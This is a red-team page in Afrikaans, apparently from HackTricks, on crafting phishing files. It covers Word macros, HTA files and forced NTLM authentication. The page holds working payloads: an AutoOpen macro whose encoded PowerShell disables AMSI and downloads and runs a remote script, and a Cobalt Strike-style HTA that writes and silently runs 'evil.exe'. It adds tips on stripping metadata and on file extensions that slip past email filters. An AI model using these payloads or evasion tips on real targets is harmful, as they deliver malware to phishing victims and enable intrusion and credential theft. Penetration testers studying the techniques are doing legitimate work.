# Phishing Lêers & Dokumente

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks-repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Kantoor Dokumente

Microsoft Word voer data-validering uit voordat 'n lêer geopen word. Data-validering word uitgevoer in die vorm van datastruktuur-identifikasie, teen die OfficeOpenXML-standaard. As enige fout tydens die identifikasie van die datastruktuur voorkom, sal die geanaliseerde lêer nie geopen word nie.

Gewoonlik gebruik Word-lêers wat makros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul makro-uitvoeringsvermoë te behou.\
Byvoorbeeld, 'n RTF-lêer ondersteun nie makros, volgens ontwerp nie, maar 'n DOCM-lêer wat na RTF hernoem word, sal deur Microsoft Word hanteer word en in staat wees om makros uit te voer.\
Dieselfde interne en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint ens.).

Jy kan die volgende bevel gebruik om te kyk watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
### Eksterne Beeld Laai

Gaan na: _Invoeg --> Vinnige Dele --> Veld_\
_**Kategorieë**: Skakels en Verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### Agterdeur vir Makro's

Dit is moontlik om makro's te gebruik om willekeurige kode vanuit die dokument uit te voer.

#### Outomatiese Laai Funksies

Hoe algemener hulle is, hoe waarskynlik sal die AV dit opspoor.

* AutoOpen()
* Document\_Open()

#### Voorbeelde van Makro Kode
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder handmatig metadata

Gaan na **Lêer > Inligting > Inspekteer Dokument > Inspekteer Dokument**, wat die Dokument Inspekteerder sal oopmaak. Klik op **Inspekteer** en dan **Verwyder Alles** langs **Dokumenteienskappe en Persoonlike Inligting**.

#### Dokumentuitbreiding

Wanneer jy klaar is, kies die **Stoor as tipe**-keuselys, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar is 'n **stigma** **rondom** die makro-geaktiveerde **`.docm`**-uitbreiding (bv. die duimnaelsimbool het 'n groot `!` en sommige web-/e-poshekke blokkeer dit heeltemal). Daarom is hierdie **oudmodiese `.doc`-uitbreiding die beste kompromie**.

#### Kwaadwillige Makro-Generator

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA-lêers

'n HTA is 'n Windows-program wat **HTML en skripsietale (soos VBScript en JScript)** kombineer. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "volledig vertroude" toepassing, sonder die beperkings van 'n blaaier se sekuriteitsmodel.

'n HTA word uitgevoer met behulp van **`mshta.exe`**, wat tipies **geïnstalleer** word saam met **Internet Explorer**, wat **`mshta` afhanklik maak van IE**. As dit egter gedeïnstalleer is, sal HTA's nie kan uitvoer nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Dwangmatige NTLM-verifikasie

Daar is verskeie maniere om **NTLM-verifikasie "op afstand" af te dwing**, byvoorbeeld deur **onsigbare beelde** by e-posse of HTML in te voeg wat die gebruiker sal toegang (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **verifikasie sal veroorsaak** net vir die **oopmaak van die vouer**.

**Kyk na hierdie idees en meer op die volgende bladsye:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM-oordrag

Moenie vergeet dat jy nie net die hasie of die verifikasie kan steel nie, maar ook **NTLM-oordragaanvalle kan uitvoer**:

* [**NTLM-oordragaanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM-oordrag na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
